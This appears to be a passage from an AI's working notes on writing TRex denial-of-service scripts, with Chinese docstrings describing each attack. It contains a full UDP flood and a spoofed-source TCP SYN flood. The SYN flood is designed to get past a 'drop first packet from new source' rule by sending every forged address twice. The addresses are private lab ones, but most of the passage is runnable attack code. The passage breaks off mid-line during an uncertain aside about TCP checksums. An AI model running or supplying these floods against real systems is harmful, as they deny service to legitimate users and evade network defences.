        UDP 载荷字节数\n    PPS=20000                单端口发包速率\n    DURATION=30              攻击持续秒数\n    PORT=0                   TRex 发送端口\n预期效果: 目标网卡 RX PPS/带宽被打满，正常 UDP 业务丢包、RTT 升高，\n          触发 UDP 泛洪/大流量告警，可能拖垮软中断处理。\n\"\"\"\nfrom trex_stl_lib.api import *\nimport time\n\nSERVER     = \"10.99.80.222\"\nTARGET     = \"10.99.80.100\"\nSRC_MIN    = \"16.0.0.1\"\nSRC_MAX    = \"16.0.0.64\"\nDST_PORT   = 53\nSPORT_MIN  = 1024\nSPORT_MAX  = 65535\nPKT_SIZE   = 1024\nPPS        = 20000\nDURATION   = 30\nPORT       = 0\n\n\ndef build_streams():\n    payload = \"X\" * PKT_SIZE\n    base = Ether()/IP(src=SRC_MIN, dst=TARGET)/UDP(sport=SPORT_MIN, dport=DST_PORT)/Raw(load=payload)\n    vm = STLScVmRaw([\n        STLVmFlowVar(name=\"src\",   min_value=SRC_MIN,   max_value=SRC_MAX,   size=4, op=\"inc\"),\n        STLVmWrFlowVar(fv_name=\"src\", pkt_offset=\"IP.src\"),\n        STLVmFlowVar(name=\"sport\", min_value=SPORT_MIN, max_value=SPORT_MAX, size=2, op=\"inc\"),\n        STLVmWrFlowVar(fv_name=\"sport\", pkt_offset=\"UDP.sport\"),\n        STLVmFixIpv4(offset=\"IP\"),\n    ])\n    pkt = STLPktBuilder(pkt=base, vm=vm)\n    return [STLStream(packet=pkt, mode=STLTXCont(pps=PPS))]\n\n\ndef main():\n    c = STLClient(server=SERVER)\n    c.connect()\n    try:\n        c.reset(ports=[PORT])\n        c.add_streams(build_streams(), ports=[PORT])\n        c.start(ports=[PORT], duration=DURATION)\n        time.sleep(DURATION + 2)\n        c.stop(ports=[PORT])\n    finally:\n        c.disconnect()\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\nGood.\n\n--- cat_syn_flood_retrans.py ---\n\nTwo streams over same small source pool → each source emits ≥2 SYNs.\n\n```python\n\"\"\"\n攻击名称: 多源IP TCP SYN 泛洪 + 重传（绕过首包丢弃）\n攻击类别: 半连接耗尽型 DoS / 连接表资源耗尽\n攻击机制: 伪造大量源 IP 向目标端口发送 TCP SYN。为绕过\"新源首包丢弃\"规则，\n          脚本用两条流共用同一小源 IP 池：主突发流(高 PPS) + 重传流(低 PPS)，\n          使每个源 IP 至少发送 2 个 SYN，形成\"已见源\"从而被放行并进入 SYN_RECV 队列。\n关键参数:\n    SRC_MIN/SRC_MAX   伪造源 IP 池（16.0.0.1~16.0.0.64）\n    DST_PORT=80       目标端口\n    BURST_PPS=12000   首包突发速率\n    RETRANS_PPS=4000  重传速率\n    DURATION=30       持续秒数\n预期效果: 目标 SYN_RECV/半连接队列被占满，新连接被丢弃或超时，\n          正常用户无法建立 TCP 连接，触发 SYN 泛洪告警。\n\"\"\"\nfrom trex_stl_lib.api import *\nimport time\n\nSERVER      = \"10.99.80.222\"\nTARGET      = \"10.99.80.100\"\nSRC_MIN     = \"16.0.0.1\"\nSRC_MAX     = \"16.0.0.64\"\nDST_PORT    = 80\nSPORT_MIN   = 1024\nSPORT_MAX   = 60000\nBURST_PPS   = 12000\nRETRANS_PPS = 4000\nDURATION    = 30\nPORT        = 0\n\n\ndef _syn_stream(src_min, src_max, pps):\n    base = Ether()/IP(src=src_min, dst=TARGET)/TCP(sport=SPORT_MIN, dport=DST_PORT, flags=\"S\", seq=0)\n    vm = STLScVmRaw([\n        STLVmFlowVar(name=\"src\",   min_value=src_min, max_value=src_max, size=4, op=\"inc\"),\n        STLVmWrFlowVar(fv_name=\"src\", pkt_offset=\"IP.src\"),\n        STLVmFlowVar(name=\"sport\", min_value=SPORT_MIN, max_value=SPORT_MAX, size=2, op=\"inc\"),\n        STLVmWrFlowVar(fv_name=\"sport\", pkt_offset=\"TCP.sport\"),\n        STLVmFixIpv4(offset=\"IP\"),\n    ])\n    return STLStream(packet=STLPktBuilder(pkt=base, vm=vm), mode=STLTXCont(pps=pps))\n\n\ndef build_streams():\n    return [\n        _syn_stream(SRC_MIN, SRC_MAX, BURST_PPS),\n        _syn_stream(SRC_MIN, SRC_MAX, RETRANS_PPS),\n    ]\n```\n\nHmm, note TCP checksum. TRex auto-computes? For TCP, if we change IP/L4 fields we'd need to fix checksums. TRex has STLVmFixIpv4 for IP checksum but TCP checksum... TRex recomputes L4 checksum automatically? Actually TRex has a hardware/software checksum offload for some. There's `STLVmFixChecksumHw`? Hmm. Since only sport/src change, TCP checksum would be wrong. For a flood it may not matter (target may drop). But ideally fix. There's `STLVmFixIpv4` fixes IP checksum; for TCP there's... Actually TRex automatically fixes checksums when using `pkt_offset` writes? No.\n\nFor demonstration, I'll note it. Many TRex flood scripts ignore TCP checksum or use TRex's checksum fix. There is `STLVmWrFlowVar(..., pkt_offs